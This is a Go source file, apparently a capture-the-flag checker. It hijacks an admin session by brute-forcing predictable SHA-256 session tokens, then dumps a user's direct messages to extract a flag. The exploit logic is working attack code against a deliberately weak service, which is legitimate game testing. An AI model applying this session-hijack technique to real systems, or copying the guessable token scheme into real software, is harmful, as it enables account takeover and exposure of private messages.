package handler

import (
	"checker/pkg/client"
	"checker/service/database"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"regexp"
	"time"
)

const sessionTokenSize = 32

func generateSessionToken(val byte) string {
	token := make([]byte, sessionTokenSize)
	for i := 0; i < sessionTokenSize; i++ {
		token[i] = val
	}
	tokenHash := sha256.New()
	tokenHash.Write(token)
	return hex.EncodeToString(tokenHash.Sum(nil))
}

func (h *Handler) hijackAdminSession(ctx context.Context, userName, addr, flagReStr string) (string, error) {
	if len(userName) == 0 {
		return "", fmt.Errorf("attackInfo missing")
	}

	flagRe, err := regexp.Compile(flagReStr)
	if err != nil {
		return "", err
	}

	hijacker, err := client.GenerateNewUser()
	if err != nil {
		return "", err
	}

	sshClient, sessionIO, ch, err := client.CreateSSHSession(ctx, hijacker.Name, addr, hijacker.PrivateKey)
	if err != nil {
		return "", err
	}
	defer ch.Execute()

	adminClient, acCh, err := client.AttachRPCAdminClient(ctx, sshClient, sessionIO.PublicKey, true)
	if err != nil {
		return "", err
	}
	defer acCh.Execute()

	flagChan := make(chan string)
	errChan := make(chan error)
	go func() {
		defer close(flagChan)
		for i := 0; i < 256; i++ {
			adminClient.SessionToken = generateSessionToken(byte(i))
			err := adminClient.SendMessageToRoom(hijacker.Name, "xxx")
			if err != nil {
				continue
			}
			err = adminClient.DumpDirectMessages(userName, func(entry *database.MessageEntry) {
				flags := flagRe.FindAllString(entry.Body, 1)
				if len(flags) > 0 {
					flagChan <- flags[0]
				}
			})
			if err != nil {
				h.log.Println(err)
			}
			return
		}
		errChan <- fmt.Errorf("session not hijacked")
		close(errChan)
	}()

	select {
	case <-time.After(time.Second * 5):
		return "", fmt.Errorf("flag not found")
	case <-ctx.Done():
		return "", ctx.Err()
	case err := <-errChan:
		return "", err
	case flag := <-flagChan:
		return flag, nil
	}
}
